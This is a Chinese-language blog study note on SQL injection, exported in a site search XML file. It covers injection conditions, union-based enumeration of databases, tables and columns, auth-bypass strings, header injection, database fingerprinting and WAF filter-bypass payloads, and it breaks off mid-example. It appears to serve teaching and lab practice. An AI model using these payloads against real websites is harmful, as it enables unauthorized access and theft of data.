<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>SQL注入漏洞</title>
    <link href="/2023/10/11/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/10/11/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="01-web网站基础框架"><a href="#01-web网站基础框架" class="headerlink" title="01:web网站基础框架"></a>01:web网站基础框架</h1><h4 id="项目架构："><a href="#项目架构：" class="headerlink" title="项目架构："></a>项目架构：</h4><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011203622770.png" alt="image-20231011203622770"></p><h4 id="SQL注入的发生"><a href="#SQL注入的发生" class="headerlink" title="SQL注入的发生"></a>SQL注入的发生</h4><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011204700027.png" alt="image-20231011204700027" style="zoom:80%;" /><p><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205254395.png" alt="image-20231011205254395"></p><h4 id="SQL注入之数据库概述"><a href="#SQL注入之数据库概述" class="headerlink" title="SQL注入之数据库概述"></a>SQL注入之数据库概述</h4><p>数据库就是一个存储数据的仓库，数据库是以一定方式存储在一起，能与多个用户共享，具有尽可能小的冗余，与应用程序彼此独立的数据集合。</p><h5 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h5><p>关系型数据库，存储的格式可以直观地反映实体间的关系，和常见的表格比较相似</p><p>关系型数据库中表与表之间有很多复杂的关联关系的</p><p>常见的关系型数据库有MySQL，Orcale，PostgreSQL , SQL Server等。</p><h5 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h5><p>随着近些年技术方向的不断扩展，大量的NoSQL数据库如 Mon goDB，Redis出于简化数据库结构，避免冗余，影响性能的表连接。摒弃复杂分布式的目的被设计</p><p>NoSQL数据库适合追求速度和可扩展性，业务多变的场景</p><h5 id="SQL语句语法回顾："><a href="#SQL语句语法回顾：" class="headerlink" title="SQL语句语法回顾："></a>SQL语句语法回顾：</h5><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查询当前数据库服务器所有的数据库<br><span class="hljs-keyword">show</span> databases;<br>选中某个数据库<br>use 数据库名字 test<br>查询当前数据库所有的表<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>；<br>查询t1表所有数据<br>查询关键 <span class="hljs-keyword">select</span> <br>* 所有<br><span class="hljs-keyword">from</span>  表名<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1;<br>条件查询 id=<span class="hljs-number">2</span><br><span class="hljs-keyword">where</span> 条件  编程 <span class="hljs-keyword">if</span>（条件 <span class="hljs-keyword">true</span>）&#123;执行&#125;<br><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> id=<span class="hljs-number">2</span>；<br>查询id=<span class="hljs-number">2</span>   pass =<span class="hljs-number">111</span><br><span class="hljs-keyword">union</span> 合并查询 <br><span class="hljs-number">2</span>个特性：<br>前面查询的语句 和 后面的查询语句 结果互不干扰！<br>前面的查询语句的字段数量 和 后面的查询语句字段数量  要一致<br><br>* == <span class="hljs-number">3</span><br><span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> t1 <span class="hljs-keyword">where</span> pass =<span class="hljs-number">111</span>;<br><br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 排序<br><span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> 字段名字  id  也可以 跟上数字 <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> .。。。。。<br><br>猜解表的列数 知道表有几列 <br></code></pre></td></tr></table></figure><h4 id="系统库释义"><a href="#系统库释义" class="headerlink" title="系统库释义"></a>系统库释义</h4><img src="https://blog-p0chen.oss-cn-beijing.aliyuncs.com/img/image-20231011205657206.png" alt="image-20231011205657206" style="zoom:80%;" /><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span>information_schema 库：是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息；<br><br>SCHEMATA 表：提供了当前MySQL实例中所有数据库信息， <span class="hljs-keyword">show</span> databases结果取之此表。<br><br><span class="hljs-keyword">TABLES</span>表：提供了关于数据中表的信息。<span class="hljs-built_in">table_name</span><br><br><span class="hljs-keyword">COLUMNS</span>表：提供了表的列信息，详细描述了某张表的所有列以及每个列的信息。<span class="hljs-built_in">column_name</span><br><br><span class="hljs-number">2</span>、performance_schema库具有<span class="hljs-number">87</span>张表。<br>MySQL <span class="hljs-number">5.5</span>开始新增一个数据库：PERFORMANCE_SCHEMA，主要用于收集数据库服务器性能参数。内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级。<br><br><span class="hljs-number">3</span>、mysql库是核心数据库，类似于<span class="hljs-keyword">sql</span> <span class="hljs-keyword">server</span>中的master表，主要负责存储数据库的用户（账户）信息、权限设置、关键字等mysql自己需要使用的控制和管理信息。不可以删除，如果对mysql不是很了解，也不要轻易修改这个数据库里面的表信息。<br>常用举例：在mysql.<span class="hljs-keyword">user</span>表中修改root用户的密码<br><br><span class="hljs-number">4</span>、sys库具有<span class="hljs-number">1</span>个表，<span class="hljs-number">100</span>个视图。<br>sys库是MySQL <span class="hljs-number">5.7</span>增加的系统数据库，这个库是通过视图的形式把information_schema和performance_schema结合起来，查询出更加令人容易理解的数据。<br>可以查询谁使用了最多的资源，哪张表访问最多等。<br></code></pre></td></tr></table></figure><h4 id="SQL注入的产生需要满足以下两个条件"><a href="#SQL注入的产生需要满足以下两个条件" class="headerlink" title="SQL注入的产生需要满足以下两个条件"></a><strong>SQL注入的产生需要满足以下两个条件</strong></h4><ol><li>参数用户可控：前端传给后端的参数用户可控。</li><li>参数带入数据库查询：传入的参数拼接到SQL语句中，且带入数据库中查询。</li></ol><h4 id="SQL注入基础危害："><a href="#SQL注入基础危害：" class="headerlink" title="SQL注入基础危害："></a>SQL注入基础危害：</h4><p>）盗取网站的敏感信息;<br>）绕过网站后台认证 后台登录语句： SELECT * FROM admin WHERE Username&#x3D;‘user’ and Password&#x3D;‘pass’ 万能密码：‘or ’1‘ &#x3D; ’1‘ # ;<br>）借助SQL注入漏洞提权获取系统权限;<br>）读取文件信息。</p><h4 id="MYSQL数据库注入-常用函数："><a href="#MYSQL数据库注入-常用函数：" class="headerlink" title="MYSQL数据库注入-常用函数："></a>MYSQL数据库注入-常用函数：</h4><p>（1）user() 返回当前使用数据库的用户，也就是网站配置文件中连接数据库的账号 </p><p>（2）version() 返回当前数据库的版本 </p><p>（3）database() 返回当前使用的数据库，只有在use命令选择一个数据库之后，才能查到 （4）group_concat() 把数据库中的某列数据或某几列数据合并为一个字符串 </p><p>（5）@@datadir 数据库路径 </p><p>（6）@@version_compile_os 操作系统版本</p><h4 id="SQL-联合-注入流程："><a href="#SQL-联合-注入流程：" class="headerlink" title="SQL(联合)注入流程："></a>SQL(联合)注入流程：</h4><ol><li><p>?id&#x3D;1 and 1&#x3D;1</p></li><li><p>判断有无闭合 and 1&#x3D;1 and 1&#x3D;2 &#x2F;&#x2F;结果和第一个一样说明需要闭合，反之无闭合 有闭合则需要用到 –+闭合</p></li><li><p>猜解字段 order by 10 &#x2F;&#x2F;采用二分法</p></li><li><p>判断数据回显位置 -1 union select 1，2，3，4，5…. &#x2F;&#x2F;参数等号后面加-表示不显示当前数据</p></li><li><p>获取当前数据库名、用户、版本 union select version(),database()，user()，4…… 4、获取全部数据库名</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqf">union <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-built_in">select</span> <span class="hljs-built_in">group</span>\<span class="hljs-variable">_concat</span>(schema\<span class="hljs-variable">_name</span>)<span class="hljs-keyword">from</span> information\<span class="hljs-variable">_schema</span>.schemata)<br></code></pre></td></tr></table></figure></li><li><p>获取表名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group</span>\_concat(<span class="hljs-keyword">table</span>\_name)<span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_schema=<span class="hljs-string">&#x27;库名&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>获取字段名：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">group</span>\_concat(<span class="hljs-keyword">column</span>\_name)<span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_name=<span class="hljs-string">&#x27;表名&#x27;</span><br></code></pre></td></tr></table></figure></li><li><p>获取数据 union select 1,2,(select group_concat(字段1，字段2)from 库名.表名<br>函数名称： 函数功能：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查 库： <span class="hljs-keyword">select</span> <span class="hljs-keyword">schema</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">schema</span><br>查 表： <span class="hljs-keyword">select</span> <span class="hljs-keyword">table</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_schema=库名<br>查 列： <span class="hljs-keyword">select</span> <span class="hljs-keyword">column</span>\_name <span class="hljs-keyword">from</span> information\_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">table</span>\_name=表名<br>查数据： <span class="hljs-keyword">select</span> 列名 <span class="hljs-keyword">from</span> 库名.表名<br></code></pre></td></tr></table></figure></li></ol><p>总结–普通SQL注入必备条件：<br>1、界面能够回显数据库查询到的数据（必要条件）；<br>2、界面回显内容至少能够显示数据库中的某列数据（必要条件）；<br>3、部分能够直接提供数据库报错内容的回显；</p><h2 id="SQL注入思路"><a href="#SQL注入思路" class="headerlink" title="SQL注入思路"></a>SQL注入思路</h2><h3 id="1）判断是否可以注入"><a href="#1）判断是否可以注入" class="headerlink" title="1）判断是否可以注入"></a>1）判断是否可以注入</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">在<span class="hljs-meta">GET</span>参数、POST参数、Cookie、Referer、XFF、UA等地方尝试插入代码、符号或语句，尝试是否存在数据库参数读取行为，以及能否对其参数产生影响，如产生影响则说明存在注入点。<br></code></pre></td></tr></table></figure><h3 id="2）sql注入点类型"><a href="#2）sql注入点类型" class="headerlink" title="2）sql注入点类型"></a>2）sql注入点类型</h3><ol><li>get注入<br>在get传参时写入参数，将SQl语句闭合，后面加写入自己的SQL语句。</li><li>post注入<br>通过post传参，原理与get一样，重要的是判断我们所输入的信息是否与数据库产生交互，其次判断SQL语句是如何闭合的。</li><li>有些网站通过查询cookie判断用户是否登录，需要与数据库进行交互，我们可以修改cookie的值，查找我们所需要的东西。或者通过报错注入是网页返回报错信息。</li><li>Referer注入<br>Referer正确写法应该是Referrer,因为http规定时写错只能将错就错，有些网站会记录ip和访问路径，例如百度就是通过Referer来统计网站流量，我们将访问路径进行SQL注入，同样也可以得到想要的信息。</li><li>XFF注入<br>在用户登录注册模块在 HTTP 头信息添加 X-Forwarded-for: 9.9.9.9’ ，用户在注册的时候，如果存在安全隐 患，会出现错误页面或者报错。从而导致注册或者登录用户失败。<br>burpsuite 抓包，提交输入检测语句：</li></ol><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">X-Forwarded-for: 127.0.0.1&#x27;and 1=1#<br>X-Forwarded-for: 127.0.0.1&#x27;and 1=2#<br></code></pre></td></tr></table></figure><p>​两次提交返回不一样，存在 SQL 注入漏洞</p><ol start="6"><li>UA注入<br>输入点在User-Agent</li></ol><h3 id="3）判断数据库类型"><a href="#3）判断数据库类型" class="headerlink" title="3）判断数据库类型"></a>3）判断数据库类型</h3><p>判断网站使用的是哪个数据库，常见数据库如：<br>MySQL、MSSQL(即SQLserver)、Oracle、Access、PostgreSQL、db2等等</p><p>在实际测试过程中尝试进行SQL注入第一步就是判断数据库类型，因为我们不容易知道对方使用的是什么数据库。<br>目前来说，企业使用MSSQL即SQLserver的数量最多，MySQL其次，Oracle再次。除此之外的几个常见数据库如 Access、PostgreSQL、db2则要少的多的多。<br>常用SQL注入判断数据库方法<br>● 使用数据库特有的函数来判断<br>● 使用数据库专属符号来判断，如注释符号、多语句查询符等等<br>● 报错信息判断<br>● 数据库特性判断</p><p>端口扫描：</p><p>如果可以对主机进行端口扫描，可以根据是否开启对应端口，来大概判断数据库类型。<br>Oracle<br>默认端口号：1521<br>SQL Server<br>默认端口号：1433<br>MySQL<br>默认端口号：3306<br>PostgreSql<br>默认端口号：5432</p><p>网站类型与数据库的联系</p><p>asp：SQL Server，Access<br>.net ：SQL Server<br>php：Mysql，PostgreSql<br>java：Oracle，Mysql</p><p>根据注释符判断</p><p>“#”是MySQL中的注释符，返回错误说明该注入点可能不是MySQL，另外也支持’– ‘,和&#x2F;* *&#x2F;注释（注意mysql使用– 时需要后面添加空格）</p><p>“null”和“%00”是Access支持的注释。</p><p>“–”是Oracle和MSSQL支持的注释符，如果返回正常，则说明为这两种数据库类型之一。</p><p>“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</p><p>根据数据库特有表进行判断</p><p>1、mssql数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from sysobjects)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>2、access数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from msysobjects)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>3、mysql数据库(mysql版本在5.0以上)</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from information\_schema.TABLES)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>4、oracle数据库</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">http://127.0.0.1/test.php?id=1 and (select count(\*) from sys.user\_tables)&gt;0 and 1=1<br></code></pre></td></tr></table></figure><p>根据其返回的错误类型</p><p><strong>ORACLE</strong><br>ORA-01756:quoted string not properly terminated<br>ORA-00933:SQLcommand not properly ended<br><strong>MS-SQL</strong><br>Msg 170,level 15, State 1,Line 1<br>Line 1:Incorrect syntax near ‘foo<br>Msg 105,level 15,state 1,Line 1<br>Unclose quotation mark before the character string ‘foo<br><strong>MYSQL</strong><br>you have an error in your SQL syntax,check the manual that corresponds to you mysql server version for the right stntax to use near ‘’foo’ at line x</p><h3 id="4）判断参数数据类型"><a href="#4）判断参数数据类型" class="headerlink" title="4）判断参数数据类型"></a>4）判断参数数据类型</h3><p>通过+1、-1、and 1&#x3D;1、and 1&#x3D;2、注释符。与其各种变种如与各种符号结合的and 1&#x3D;1、and ‘1’&#x3D;’1等等判断参数数据类型。先判断是否是整型，如果不是整型则为字符型，字符型存在多种情况，需要使用单引号【’】、双引号【”】、括号【()】多种组合方式进行试探。<br>类似判断闭合方式<br>id&#x3D;1 and 1&#x3D;1回显正常 id&#x3D;1 and1&#x3D;2回显错误（判断为整形）<br>【原因：and 1&#x3D;1或者and 1&#x3D;2 写入了sql语句并且执行成功 因为1&#x3D;2是错误所以id&#x3D;1 and 1&#x3D;2回显是错误的】<br>id&#x3D;1 and 1&#x3D;1和id&#x3D;1 and 1&#x3D;2回显正常（判断为字符型接下来判断闭合方式）<br>id&#x3D;1’ and ‘1’&#x3D;’1回显正确id&#x3D;1’ and ‘1’&#x3D;’2回显错误（判断为【’】闭合）<br>id&#x3D;1” and “1”&#x3D;”1 回显正常 id&#x3D;1” and “1”&#x3D;”2回显错误（判断为【”】闭合）<br>【原因同上】<br>判断为闭合方式为【’】型<br>以上注入不成功的时候尝试<br>1%df’ 此为宽字节注入<br>参数类型一般有数值型，字符型</p><p>数值型</p><p>前台页面输入的参数是「数字」。<br>比如下面这个根据ID查询用户的功能。</p><p>后台对应的SQL如下，字段类型是数值型，这种就是数值型注入。<br>select * from user where id &#x3D; 1;<br>写入and1&#x3D;1 与and1&#x3D;2回显不相同说明后面的and1&#x3D;1和and1&#x3D;2对网页造成了影响，判断为数值型</p><p>字符型</p><p>前台页面输入的参数是「字符串」。<br>比如下面这个登录功能，输入的用户名和密码是字符串。</p><p>后台对应的SQL如下，字段类型是字符型，这种就是字符型注入。<br>select * from user<br>where username &#x3D; ‘zhangsan’ and password &#x3D; ‘123abc’;<br>字符可以使用单引号包裹，也可以使用双引号包裹，根据包裹字符串的「引号」不同，字符型注入可以分为：「单引号字符型」注入和「双引号字符型」注入。</p><p>1）单引号字符型注入<br>参数使用「单引号」包裹时，叫做单引号字符型注入，比如下面这个SQL，就是单引号字符型注入。<br>select * from user where username &#x3D; ‘zhangsan’;<br>2）双引号字符型注入<br>参数使用「双引号」包裹时，叫做双引号字符型注入，比如下面这个SQL，就是双引号字符型注入。<br>select * from user where username &#x3D; “zhangsan”;<br>3）带有括号的注入<br>理论上来说，只有数值型和字符型两种注入类型。<br>SQL的语法，支持使用一个或多个「括号」包裹参数，使得这两个基础的注入类型存在一些变种。<br>a. 数值型+括号的注入<br>使用括号包裹数值型参数，比如下面这种SQL。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = (<span class="hljs-number">1</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> id = ((<span class="hljs-number">1</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……<br>b. 单引号字符串+括号的注入<br>使用括号和单引号包裹参数，比如下面这种SQL。</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&#x27;zhangsan&#x27;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&#x27;zhangsan&#x27;</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……<br>c. 双引号字符串+括号的注入<br>使用括号和双引号包裹参数，比如下面这种SQL</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = (<span class="hljs-string">&quot;zhangsan&quot;</span>);<br><span class="hljs-keyword">select</span> \* <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = ((<span class="hljs-string">&quot;zhangsan&quot;</span>));<br></code></pre></td></tr></table></figure><p>包裹多个括号……</p><h3 id="5）判断数据库语句过滤情况"><a href="#5）判断数据库语句过滤情况" class="headerlink" title="5）判断数据库语句过滤情况"></a>5）判断数据库语句过滤情况</h3><p>正常输入sql语句如果通过查看回显来判断语句是否被过滤<br><strong>判断列数</strong><br>如果order by被过滤则尝试绕过，如果无法绕过就无法得到列数，这时就无法使用联合查询注入。<br><strong>判断显示位</strong><br>如果页面没有显示位，同样无法使用联合查询注入。<br><strong>报错信息</strong><br>如果没有报错信息返回，则无法使用报错注入。</p><h3 id="6）绕过-过滤"><a href="#6）绕过-过滤" class="headerlink" title="6）绕过 过滤"></a>6）绕过 过滤</h3><p>正常进行sql注入，通过回显来判断数据是否被过滤</p><h5 id="1、过滤关键字"><a href="#1、过滤关键字" class="headerlink" title="1、过滤关键字"></a>1、过滤关键字</h5><p>过滤关键字应该是最常见的过滤了，因为只要把关键字一过滤，你的注入语句基本就不起作用了。<br>绕过方法：<br>（1）最常用的绕过方法就是用**&#x2F;<strong>&#x2F;，&lt;&gt;，分割关键字</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">sel&lt;&gt;ect<br>sel/**/ect<br></code></pre></td></tr></table></figure><p>（2）根据过滤程度，有时候还可以用双写绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">selselectect<br></code></pre></td></tr></table></figure><p>（3）既然是过滤关键字，大小写应该都会被匹配过滤，所以大小写绕过一般是行不通的。<br>（4）有时候还可以使用编码绕过</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">url编码绕过<br>16进制编码绕过<br>ASCII编码绕过<br></code></pre></td></tr></table></figure><h5 id="2、过滤逗号"><a href="#2、过滤逗号" class="headerlink" title="2、过滤逗号"></a>2、过滤逗号</h5><p>常见的几种注入方法基本上都要使用逗号，要是逗号被过滤了，那就只能想办法绕过了。<br>绕过方法：<br>（1）简单注入可以使用join方法绕过<br>原语句：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">union select 1,2,3<br></code></pre></td></tr></table></figure><p>join语句：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">union select * from (select 1)a join (select 2)b join (select 3)<br></code></pre></td></tr></table></figure><p>（2）对于盲注的那几个函数substr(),mid(),limit</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">substr和mid()可以使用from for的方法解决<br>substr(str from pos for len) //在str中从第pos位截取len长的字符<br>mid(str from pos for len)//在str中从第pos位截取len长的字符<br>limit可以用offset的方法绕过<br>limit 1 offset 1<br>使用substring函数也可以绕过<br>substring(str from pos) //返回字符串str的第pos个字符，索引从1开始<br></code></pre></td></tr></table></figure><h5 id="3、过滤空格"><a href="#3、过滤空格" class="headerlink" title="3、过滤空格"></a>3、过滤空格</h5><p>空格被过滤有以下几种方法绕过：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">（1）双空格 <br>（2）/**/ <br>（3）用括号绕过 <br>（4）用回车代替 //ascii码为chr(13)&amp;chr(10)，url编码为%0d%0a<br></code></pre></td></tr></table></figure><h5 id="4、过滤等号"><a href="#4、过滤等号" class="headerlink" title="4、过滤等号"></a>4、过滤等号</h5><p>如果等号被过滤了我们可以用 like 代替<br>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h5 id="5、过滤大于小于号"><a href="#5、过滤大于小于号" class="headerlink" title="5、过滤大于小于号"></a>5、过滤大于小于号</h5><p>盲注中我们经常需要用到比较符，如果他们被过滤了，我们可以用以下几种方法绕过：<br>（</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">1）greatest(n1,n2,n3,...)//返回其中的最大值<br>（2）strcmp(str1,str2)//当str1=str2，返回0，当str1&gt;str2，返回1，当str1&lt;str2，返回-1<br>（3）in 操作符<br>（4）between   and//选取介于两个值之间的数据范围。这些值可以是数值、文本或者日期。<br></code></pre></td></tr></table></figure><h5 id="6-等价函数绕过"><a href="#6-等价函数绕过" class="headerlink" title="6.等价函数绕过"></a>6.等价函数绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">hex()、bin() ==&gt; ascii() <br>sleep() ==&gt;benchmark() <br>concat_ws()==&gt;group_concat() <br>mid()、substr() ==&gt; substring() <br>@@user ==&gt; user() <br>@@datadir ==&gt; datadir() <br>举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74　 <br>或者： substr((select &#x27;password&#x27;),1,1) = 0x70 <br>strcmp(left(&#x27;password&#x27;,1), 0x69) = 1 <br>strcmp(left(&#x27;password&#x27;,1), 0x70) = 0 <br>strcmp(left(&#x27;password&#x27;,1), 0x71) = -1<br></code></pre></td></tr></table></figure><h3 id="7）根据注入情况使用注入方式"><a href="#7）根据注入情况使用注入方式" class="headerlink" title="7）根据注入情况使用注入方式"></a>7）根据注入情况使用注入方式</h3><p>使用id&#x3D;1进行尝试尝试 继续使用order by 查询显示位 union select 1，2，3 查询无显示，即无法得到显示位或无法得到列数时放弃使用联合查询<br>尝试使用报错语句?id&#x3D;1’ and updatexml(1,concat(0x7e,database(),0x7e),1) –+等没有报错信息显示时放弃使用报错注入<br>尝试使用布尔盲注和时间盲注（建议使用工具进行注入）</p><h5 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h5><p>前提：知道列数且页面上有显示位。<br>判断显示位、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。<br>列数</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select id,username,password from security.users where id=1 order by 1;<br></code></pre></td></tr></table></figure><p>显示位</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select id,username,password from security.users where id=1 union select 1,2,3;<br></code></pre></td></tr></table></figure><p>数据库名</p><h5 id="关于将id值设置为0或者负数的解释"><a href="#关于将id值设置为0或者负数的解释" class="headerlink" title="关于将id值设置为0或者负数的解释"></a>关于将id值设置为0或者负数的解释</h5><p>由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。<br>要让数据库查询我们插入的语句，需要让原有SQL语句产生查询错误，注意：查询错误不是语法错误，查询错误只会返回空，不会让语句报错。<br>所以我们可以使id&#x3D;0或id&#x3D;-1，零或负数不会被用作id值，它插入进去一定导致原有SQL语句查询结果为空，我们插入的SQL语句的结果就会被返回。<br>联合查询时union select无法执行时 用union+select代替 接下来的查询语句空格全部用【+】代替</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">?id=-1&#x27; union select 1,2,database() --+<br></code></pre></td></tr></table></figure><p>或所有数据库名</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 